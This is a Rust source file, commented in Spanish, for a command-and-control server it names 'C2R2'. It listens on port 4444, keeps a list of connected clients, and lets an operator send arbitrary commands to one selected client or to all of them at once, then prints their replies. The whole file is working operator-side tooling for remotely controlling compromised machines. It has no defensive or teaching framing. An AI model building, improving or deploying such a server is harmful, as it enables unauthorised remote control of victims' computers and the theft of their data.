use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::sync::mpsc;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicU64, Ordering};
use std::io::{self, BufRead, Write};
use clap::Parser;

type ClientId = u64;

const DELIMITER: &str = "\n<<END>>\n";

#[derive(Parser)]
#[command(name = "c2r2-server")]
#[command(about = "C2R2 Command & Control Server", long_about = None)]
struct Args {
    /// Dirección IP donde bindear (0.0.0.0 para todas las interfaces)
    #[arg(short, long, default_value = "0.0.0.0")]
    bind: String,

    /// Puerto donde escuchar conexiones
    #[arg(short, long, default_value_t = 4444)]
    port: u16,
    
    /// Modo verboso
    #[arg(short, long)]
    verbose: bool,
}

// Estructura para manejar cada cliente
struct ClientHandle {
    id: ClientId,
    addr: String,
    tx: mpsc::UnboundedSender<String>,
}

// Maneja la comunicación con un cliente
async fn handle_client(
    id: ClientId,
    stream: TcpStream,
    clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>,
) {
    let addr = stream.peer_addr().unwrap().to_string();
    println!("🔗 Nuevo cliente [{}] desde {}", id, addr);

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();
    
    {
        let mut clients = clients.lock().unwrap();
        clients.insert(id, ClientHandle {
            id,
            addr: addr.clone(),
            tx,
        });
    }

    let (reader, mut writer) = stream.into_split();
    let mut reader = BufReader::new(reader);

    // Tarea para enviar comandos al cliente
    let send_task = tokio::spawn(async move {
        while let Some(cmd) = rx.recv().await {
            let message = format!("{}\n", cmd);
            if let Err(e) = writer.write_all(message.as_bytes()).await {
                eprintln!("❌ Error enviando a cliente: {}", e);
                break;
            }
            if let Err(e) = writer.flush().await {
                eprintln!("❌ Error en flush: {}", e);
                break;
            }
        }
    });

    // Tarea para recibir respuestas del cliente
    let recv_task = tokio::spawn(async move {
        let mut buffer = String::new();
        
        loop {
            buffer.clear();
            
            // Leer hasta encontrar el delimitador
            loop {
                let mut line = String::new();
                match reader.read_line(&mut line).await {
                    Ok(0) => return,
                    Ok(_) => {
                        buffer.push_str(&line);
                        if buffer.contains(DELIMITER) {
                            break;
                        }
                    }
                    Err(e) => {
                        eprintln!("⚠️ Error leyendo de cliente {}: {}", id, e);
                        return;
                    }
                }
            }
            
            // Remover delimitador y mostrar respuesta
            let response = buffer.replace(DELIMITER, "").trim().to_string();
            if !response.is_empty() {
                println!("\n📨 Respuesta del cliente [{}]:\n{}\n", id, response);
                print!("> ");
                let _ = io::stdout().flush();
            }
        }
    });

    // Esperar a que termine alguna tarea
    tokio::select! {
        _ = send_task => {},
        _ = recv_task => {},
    }

    // Limpiar cliente
    clients.lock().unwrap().remove(&id);
    println!("❌ Cliente [{}] desconectado", id);
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    println!("🚀 C2R2 Server v1.0");
    println!("🔗 Escuchando en {}:{}", args.bind, args.port);
    println!("📝 Use /help para ver comandos disponibles");
    println!("{}", "-".repeat(50));

    let listener = TcpListener::bind(format!("{}:{}", args.bind, args.port))
        .await
        .expect("No se pudo iniciar el servidor");

    let clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>> = Arc::new(Mutex::new(HashMap::new()));
    let next_id = Arc::new(AtomicU64::new(1));
    let selected_client: Arc<Mutex<Option<ClientId>>> = Arc::new(Mutex::new(None));

    // Tarea para aceptar conexiones
    let clients_clone = clients.clone();
    let next_id_clone = next_id.clone();
    tokio::spawn(async move {
        loop {
            match listener.accept().await {
                Ok((stream, _)) => {
                    let id = next_id_clone.fetch_add(1, Ordering::SeqCst);
                    let clients = clients_clone.clone();
                    tokio::spawn(handle_client(id, stream, clients));
                }
                Err(e) => {
                    eprintln!("❌ Error aceptando conexión: {}", e);
                }
            }
        }
    });

    // Loop para comandos del usuario
    let stdin = io::stdin();
    let mut lines = stdin.lock().lines();

    loop {
        print!("> ");
        let _ = io::stdout().flush();

        if let Some(Ok(line)) = lines.next() {
            let parts: Vec<&str> = line.trim().split_whitespace().collect();
            
            if parts.is_empty() {
                continue;
            }

            match parts[0] {
                "/help" => {
                    println!("📖 Comandos disponibles:");
                    println!("  /list                    -> lista clientes conectados");
                    println!("  /select <id>             -> selecciona un cliente por ID");
                    println!("  /cmd <comando>           -> envía comando al cliente seleccionado");
                    println!("  /cmd_all <comando>       -> envía comando a todos los clientes");
                    println!("  /exit, /quit             -> cierra el servidor");
                    println!("  /help                    -> muestra esta ayuda");
                }
                "/list" => {
                    let clients = clients.lock().unwrap();
                    if clients.is_empty() {
                        println!("  No hay clientes conectados");
                    } else {
                        println!("📋 Clientes conectados:");
                        println!("{:<5} {:<25}", "ID", "Dirección");
                        println!("{}", "-".repeat(35));
                        for (id, client) in clients.iter() {
                            println!("{:<5} {:<25}", id, client.addr);
                        }
                    }
                }
                "/select" => {
                    if parts.len() < 2 {
                        println!("❌ Uso: /select <id>");
                        continue;
                    }
                    
                    if let Ok(id) = parts[1].parse::<ClientId>() {
                        let clients = clients.lock().unwrap();
                        if clients.contains_key(&id) {
                            *selected_client.lock().unwrap() = Some(id);
                            println!("✅ Cliente [{}] seleccionado", id);
                            println!("ℹ️ Ahora puedes usar /cmd <comando>");
                        } else {
                            println!("❌ Cliente {} no encontrado", id);
                        }
                    } else {
                        println!("❌ ID inválido");
                    }
                }
                "/cmd" => {
                    if parts.len() < 2 {
                        println!("❌ Uso: /cmd <comando>");
                        continue;
                    }
                    
                    let command = parts[1..].join(" ");
                    let selected = *selected_client.lock().unwrap();
                    
                    if let Some(id) = selected {
                        let clients = clients.lock().unwrap();
                        
                        if let Some(client) = clients.get(&id) {
                            if let Err(e) = client.tx.send(command.clone()) {
                                println!("❌ Error enviando comando: {}", e);
                            } else {
                                println!("📤 Comando enviado a [{}]: {}", id, command);
                            }
                        } else {
                            println!("❌ Cliente {} no encontrado, deseleccionando", id);
                            *selected_client.lock().unwrap() = None;
                        }
                    } else {
                        println!("❌ No hay cliente seleccionado. Use /select <id>");
                    }
                }
                "/cmd_all" => {
                    if parts.len() < 2 {
                        println!("❌ Uso: /cmd_all <comando>");
                        continue;
                    }
                    
                    let command = parts[1..].join(" ");
                    let clients = clients.lock().unwrap();
                    
                    if clients.is_empty() {
                        println!("❌ No hay clientes conectados");
                    } else {
                        let mut count = 0;
                        for (id, client) in clients.iter() {
                            if client.tx.send(command.clone()).is_ok() {
                                println!("📤 Comando enviado a [{}]", id);
                                count += 1;
                            }
                        }
                        println!("✅ Comando enviado a {} cliente(s)", count);
                    }
                }
                "/exit" | "/quit" => {
                    println!("👋 Cerrando servidor...");
                    std::process::exit(0);
                }
                _ => {
                    println!("❌ Comando desconocido. Use /help");
                }
            }
        }
    }
}
